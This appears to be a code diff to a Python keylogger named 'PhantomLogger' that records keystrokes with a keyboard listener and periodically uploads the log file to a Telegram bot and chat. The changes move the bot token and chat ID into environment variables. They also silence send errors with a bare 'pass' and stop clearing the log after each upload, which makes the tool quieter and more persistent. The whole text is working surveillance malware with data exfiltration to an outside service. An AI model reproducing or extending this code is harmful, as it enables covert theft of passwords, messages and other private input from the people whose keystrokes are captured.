@@ -4,15 +4,19 @@ import os
 import asyncio
 import threading
 from telegram import Bot
+from dotenv import load_dotenv
+
+load_dotenv()
 
 
 class PhantomLogger:
-    def __init__(self, bot_token=None, chat_id=None, send_interval=300):
+    def __init__(self):
         self.log_file = self._get_log_path()
-        self.bot_token = bot_token
-        self.chat_id = chat_id
-        self.send_interval = send_interval
-        self.telegram_enabled = bool(bot_token and chat_id)
+
+        self.bot_token = os.getenv('BOT_TOKEN')
+        self.chat_id = os.getenv('CHAT_ID')
+        self.send_interval = int(os.getenv('SEND_INTERVAL', 300))
+        self.telegram_enabled = bool(self.bot_token and self.chat_id)
     
     def _get_log_path(self):
         system = platform.system()
@@ -52,11 +56,8 @@ class PhantomLogger:
                     caption=f"Log file - {platform.system()}"
                 )
             
-            # empty file after send
-            open(self.log_file, 'w').close()
-            
         except Exception as e:
-            print(f"Errore invio Telegram: {e}")
+            pass 
     
     async def _telegram_scheduler(self):
         while True:
@@ -72,26 +73,18 @@ class PhantomLogger:
         log_dir = os.path.dirname(self.log_file)
         if log_dir and not os.path.exists(log_dir):
             os.makedirs(log_dir, exist_ok=True)
-
+        
         if self.telegram_enabled:
             telegram_thread = threading.Thread(
                 target=self._run_telegram_thread,
                 daemon=True
             )
             telegram_thread.start()
-
+        
         with Listener(on_press=self.on_press) as listener:
             listener.join()
 
 
 if __name__ == "__main__":
-    BOT_TOKEN = 'your_bot_token_here'
-    CHAT_ID = 'your_chat_id_here'
-    
-    logger = PhantomLogger(
-        bot_token=BOT_TOKEN,
-        chat_id=CHAT_ID,
-        send_interval=300  # 5min
-    )
-    
+    logger = PhantomLogger()
     logger.phantom_logger_manager()
